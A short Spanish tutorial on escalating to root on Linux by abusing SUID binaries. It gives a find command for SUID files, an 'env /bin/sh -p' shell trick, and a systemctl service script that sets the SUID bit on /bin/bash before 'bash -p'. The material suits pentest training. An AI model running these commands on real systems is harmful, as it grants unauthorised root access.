# Linux: Escalada por Binarios SUID

Los binarios SUID se ejecutan con privilegios del dueño (generalmente root). Si encontramos un binario SUID que no debería serlo, podemos escalar privilegios.

## Buscar Binarios SUID

```bash
find / -perm -4000 2>/dev/null
```

## Abusar de Binarios SUID

La pagina [**GTFOBins**](https://gtfobins.github.io/) muestra como abusar de binarios SUID.

### Ejemplo con env

```bash
find / -perm -4000 2>/dev/null
env /bin/sh -p
```

### Ejemplo con systemctl

Crear un archivo en `/tmp` y ejecutarlo:

```bash
nano exploit.sh
```

Contenido:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Ejecutar:

```bash
bash exploit.sh
bash -p
```

> `bash -p` ejecuta bash sin descartar privilegios SUID, dando una shell root.
